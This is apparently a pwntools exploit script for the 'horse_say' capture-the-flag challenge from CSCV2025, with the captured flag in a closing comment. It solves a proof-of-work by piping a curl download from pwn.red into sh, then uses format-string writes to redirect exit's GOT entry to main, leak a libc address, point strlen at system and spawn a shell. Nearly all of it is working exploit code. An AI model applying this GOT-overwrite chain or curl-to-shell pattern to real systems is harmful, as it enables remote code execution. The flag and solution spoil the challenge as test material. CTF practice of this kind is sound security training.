#!/usr/bin/env python3
import io
from pwn import *
import shlex

exe = ELF("./horse_say_patched")
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe
context.log_level = 'debug'

gdbscript="""
b*0x40145A
"""
def solve_pow(token: str) -> str:
    cmd = f'curl -sSfL https://pwn.red/pow | sh -s {shlex.quote(token)}'
    out = subprocess.check_output(["bash", "-lc", cmd], text=True, timeout=120)
    sol = out.strip()
    if not sol:
        raise RuntimeError("PoW solver không trả về gì.")
    return sol

def read_pow_and_send_solution(io: remote):
    io.recvuntil(b"proof of work:")
    line = io.recvline(keepends=True)
    full = b"proof of work:" + line
    log.info(full.decode(errors="ignore").rstrip())

    m = re.search(rb"sh\s+-s\s+(\S+)", full)
    if not m:
        raise ValueError("Không tìm được token trong dòng PoW.")
    token = m.group(1).decode()
    log.info(f"Token: {token}")

    io.recvuntil(b"solution:")
    sol = solve_pow(token)
    log.success(f"Solution: {sol[:16]}... (len={len(sol)})")
    io.sendline(sol.encode())

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote("pwn1.cscv.vn", 6789)
    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)

read_pow_and_send_solution(p)

exit_got = exe.got['exit']
main_addr = exe.symbols['main']
payload = fmtstr_payload(12, {exit_got: main_addr}, write_size='byte')
sla(b": ", payload)
sla(b": ", b"%6$p")
ru(b"< ")
leak = int(p.recvn(14), 16)
success(f"leak: {hex(leak)}")
libc.address = leak - 0x204643
success(f"libc base: {hex(libc.address)}")
system = libc.sym['system']
strlen_got = exe.got['strlen']

payload2 = fmtstr_payload(12, {strlen_got: system}, write_size='byte')

sla(b": ", payload2)

sla(b": ", b"/bin/sh\x00")

p.interactive()

#CSCV2025{k1m1_n0_4184_64_2ukyun_d0kyun_h45h1r1d35h1}